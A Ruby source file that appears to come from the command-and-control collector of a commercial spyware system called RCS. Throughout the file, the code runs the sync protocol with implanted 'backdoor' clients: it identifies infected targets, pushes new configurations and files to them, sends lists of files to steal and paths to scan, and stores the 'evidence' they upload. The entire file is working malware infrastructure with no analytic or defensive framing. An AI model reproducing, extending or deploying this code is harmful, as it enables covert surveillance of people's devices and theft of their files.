#
#  Command parsing or the protocol (to be mixed-in in protocol)
#

# relatives
require_relative 'db.rb'
require_relative 'sessions.rb'
require_relative 'pusher.rb'

# from RCS::Common
require 'rcs-common/trace'
require 'rcs-common/pascalize'

# system

module RCS
module Collector

module Commands

  # the commands are depicted here: http://rcs-dev/trac/wiki/RCS_Sync_Proto_Rest

  INVALID_COMMAND  = 0x00       # Don't use
  PROTO_OK         = 0x01       # OK
  PROTO_NO         = 0x02       # Nothing available
  PROTO_BYE        = 0x03       # The end of the protocol
  PROTO_ID         = 0x0f       # Identification of the target
  PROTO_CONF       = 0x07       # New configuration
  PROTO_UNINSTALL  = 0x0a       # Uninstall command
  PROTO_DOWNLOAD   = 0x0c       # List of files to be downloaded
  PROTO_UPLOAD     = 0x0d       # A file to be saved
  PROTO_EVIDENCE   = 0x09       # Upload of an evidence
  PROTO_FILESYSTEM = 0x19       # List of paths to be scanned

  LOOKUP = { PROTO_ID => :command_id,
             PROTO_CONF => :command_conf,
             PROTO_UPLOAD => :command_upload,
             PROTO_DOWNLOAD => :command_download,
             PROTO_FILESYSTEM => :command_filesystem,
             PROTO_EVIDENCE => :command_evidence,
             PROTO_BYE => :command_bye}

  # Protocol Identification
  # -> PROTO_ID  [Version, UserId, DeviceId, SourceId]
  # <- PROTO_OK, Time, Availables
  def command_id(peer, session, message)

    # backdoor version
    version = message.slice!(0..3).unpack('i').first

    # ident of the target
    user_id, device_id, source_id = message.unpascalize_ary

    trace :info, "[#{peer}][#{session[:cookie]}] Identification: #{version} '#{user_id}' '#{device_id}' '#{source_id}'"

    # get the time in UTC
    now = Time.now - Time.now.utc_offset

    # notify the pusher that the sync is in progress    
    Pusher.instance.sync_for session, version, user_id, device_id, source_id, now

    # response to the request
    command = [PROTO_OK].pack('i')

    # the time of the server to synchronize the clocks
    time = [now.to_i].pack('q')

    available = ""
    # ask to the db if there are any availables for the backdoor
    # the results are actually downloaded and saved locally
    # we will retrieve the content when the backdoor ask for them later
    if DB.instance.new_conf? session[:bid] then
      available += [PROTO_CONF].pack('i')
      trace :info, "[#{peer}][#{session[:cookie]}] Available: New config"
    end
    if DB.instance.new_downloads? session[:bid] then
      available += [PROTO_DOWNLOAD].pack('i')
      trace :info, "[#{peer}][#{session[:cookie]}] Available: New downloads"
    end
    if DB.instance.new_uploads? session[:bid] then
      available += [PROTO_UPLOAD].pack('i')
      trace :info, "[#{peer}][#{session[:cookie]}] Available: New uploads"
    end
    if DB.instance.new_filesystems? session[:bid]
      available += [PROTO_FILESYSTEM].pack('i')
      trace :info, "[#{peer}][#{session[:cookie]}] Available: New filesystems"
    end

    # calculate the total size of the response
    tot = time.length + 4 + available.length

    # prepare the response
    response = command + [tot].pack('i') + time + [available.length / 4].pack('i') + available

    return response
  end

  # Protocol End
  # -> PROTO_BYE
  # <- PROTO_OK
  def command_bye(peer, session, message)

    # notify the pusher that the sync has ended
    Pusher.instance.sync_end session

    # destroy the current session
    SessionManager.instance.delete(session[:cookie])

    trace :info, "[#{peer}][#{session[:cookie]}] Synchronization completed"

    return [PROTO_OK].pack('i')
  end

  # Protocol Conf
  # -> PROTO_CONF
  # <- PROTO_NO | PROTO_OK [ Conf ]
  def command_conf(peer, session, message)
    trace :info, "[#{peer}][#{session[:cookie]}] Configuration request"

    # the conf was already retrieved (if any) during the ident phase
    # here we get just the content (locally) without asking again to the db
    conf = DB.instance.new_conf session[:bid]

    # send the response
    if conf.nil? then
      trace :info, "[#{peer}][#{session[:cookie]}] NO new configuration"
      response = [PROTO_NO].pack('i')
    else
      trace :info, "[#{peer}][#{session[:cookie]}] New configuration (#{conf.length} bytes)"
      response = [PROTO_OK].pack('i') + [conf.length].pack('i') + conf
    end

    return response
  end

  # Protocol Upload
  # -> PROTO_UPLOAD
  # <- PROTO_NO | PROTO_OK [ left, filename, content ]
  def command_upload(peer, session, message)
    trace :info, "[#{peer}][#{session[:cookie]}] Upload request"

    # the upload list was already retrieved (if any) during the ident phase
    # here we get just the content (locally) without asking again to the db
    # the database will output one upload at a time and the 'left' number of file
    # we pass it to the backdoor which will request again if left is greater than zero
    upload, left = DB.instance.new_uploads session[:bid]

    # send the response
    if upload.nil? then
      trace :info, "[#{peer}][#{session[:cookie]}] NO uploads"
      response = [PROTO_NO].pack('i')
    else
      response = [PROTO_OK].pack('i')

      content = [left].pack('i')                     # number of uploads still waiting in the db
      content += upload[:filename].pascalize         # filename
      content += [upload[:content].length].pack('i') # file size
      content += upload[:content]                    # file content

      response += [content.length].pack('i') + content

      trace :info, "[#{peer}][#{session[:cookie]}] upload sent (#{left} left)"
    end

    return response
  end

  # Protocol Download
  # -> PROTO_DOWNLOAD
  # <- PROTO_NO | PROTO_OK [ numElem, [file1, file2, ...]]
  def command_download(peer, session, message)
    trace :info, "[#{peer}][#{session[:cookie]}] Download request"

    # the download list was already retrieved (if any) during the ident phase
    # here we get just the content (locally) without asking again to the db
    downloads = DB.instance.new_downloads session[:bid]

    # send the response
    if downloads.empty? then
      trace :info, "[#{peer}][#{session[:cookie]}] NO downloads"
      response = [PROTO_NO].pack('i')
    else
      response = [PROTO_OK].pack('i')
      list = ""
      # create the list of patterns to download
      downloads.each do |dow|
        trace :info, "[#{peer}][#{session[:cookie]}] #{dow}"
        list += dow.pascalize
      end
      response += [list.length + 4].pack('i') + [downloads.size].pack('i') + list
      trace :info, "[#{peer}][#{session[:cookie]}] #{downloads.size} download requests sent"
    end

    return response
  end

  # Protocol Filesystem
  # -> PROTO_FILESYSTEM
  # <- PROTO_NO | PROTO_OK [ numElem,[ depth1, dir1, depth2, dir2, ... ]]
  def command_filesystem(peer, session, message)
    trace :info, "[#{peer}][#{session[:cookie]}] Filesystem request"

    # the filesystem list was already retrieved (if any) during the ident phase
    # here we get just the content (locally) without asking again to the db
    filesystems = DB.instance.new_filesystems session[:bid]

    # send the response
    if filesystems.empty? then
      trace :info, "[#{peer}][#{session[:cookie]}] NO filesystem"
      response = [PROTO_NO].pack('i')
    else
      response = [PROTO_OK].pack('i')
      list = ""
      # create the list of patterns to download
      filesystems.each do |fs|
        trace :info, "[#{peer}][#{session[:cookie]}] #{fs[:depth]} #{fs[:path]}"
        list += [fs[:depth]].pack('i') + fs[:path].pascalize
      end
      response += [list.length + 4].pack('i') + [filesystems.size].pack('i') + list
      trace :info, "[#{peer}][#{session[:cookie]}] #{filesystems.size} filesystem requests sent"
    end

    return response
  end

  # Protocol Evidence
  # -> PROTO_EVIDENCE [ size, content ]
  # <- PROTO_OK | PROTO_NO
  def command_evidence(peer, session, message)

    # get the file size
    size = message.slice!(0..3).unpack('i').first

    # send the evidence to the db
    begin
      Pusher.instance.evidence size, message
      trace :info, "[#{peer}][#{session[:cookie]}] Evidence saved (#{size} bytes)"
    rescue Exception => e
      trace :warn, "[#{peer}][#{session[:cookie]}] Evidence NOT saved: #{e.message}"
      return [PROTO_NO].pack('i')
    end

    return [PROTO_OK].pack('i')
  end

end #Commands

end #Collector::
end #RCS::